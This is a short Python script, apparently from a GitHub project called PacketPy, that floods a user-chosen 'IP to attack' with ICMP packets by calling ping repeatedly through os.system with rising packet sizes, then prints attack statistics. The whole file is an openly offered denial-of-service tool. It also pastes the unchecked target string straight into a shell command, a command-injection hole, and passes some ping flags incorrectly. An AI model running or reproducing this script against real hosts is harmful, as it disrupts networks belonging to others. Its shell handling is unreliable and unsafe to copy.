# Simple ICMP flood python script
# Standalone PacketPy script
# https://github.com/fortless

import os
import time as t
import random as rand

version = '1.0-05_beta' # Don't touch this

bytessent = 0
size = 32
sent = 0

print("PacketPy " + str(version))
print("Running in standalone mode")


ip = input("IP to attack [127.0.0.1]: ")
attack = 'ping ' + ip + ' -c 1 -q'
packets = input("Number of packets to send [1000]: ")

if ip == str(""):
	ip = str("127.0.0.1")

if packets == str(""):
	packets = 1000

while int(packets) >> 0:
	attack = 'ping -q -W 0.001 -w 0.001 -c 1 -s' + str(size) + ' -S ' + str(size) + ' ' + ip + ' | grep nothing'
	size = int(size) + 1
	os.system(attack)
	bytessent = int(bytessent) + int(size)
	sent = int(sent) + 1
	packets = int(packets) - 1
	print('Left: ' + str(packets) + ', Done: ' + str(sent) + ', Packet size: ' + str(size) + ', Total bytes sent: ' + str(bytessent))
	if int(size) == 65500:
		size =  32

avgbyte = 0
avgbyte = int(bytessent) / int(sent)
print("")
os.system('clear')
print("")
print("-----------------------------------------")
print("")
print(" -=- ICMP payload finished! -=-")
print("")
print(" -=\- Payload  Statistics -/=-")
print("")
print("")
print("- Target IP: " + str(ip) + "/32 -")
print("- Number of packets left: " + str(packets) + " packets -")
print("- Number of packets sent: " + str(sent) + " packets -")
print("- Average packet size: " + str(avgbyte) + " bytes -")
print("- Last packet size: " + str(size) + " bytes -")
print("- Total amount of bytes sent: " + str(bytessent) + " bytes -")
print("- OS: " + str(os.name) + " -")
print("- PacketPy version: " + str(version) + " -")
print("")
print("PacketPy, an open-source")
print("network tool library, written in")
print("Python.")
print("")
print("Standalone mode (ICMP Flood)")
print("-----------------------------------------")
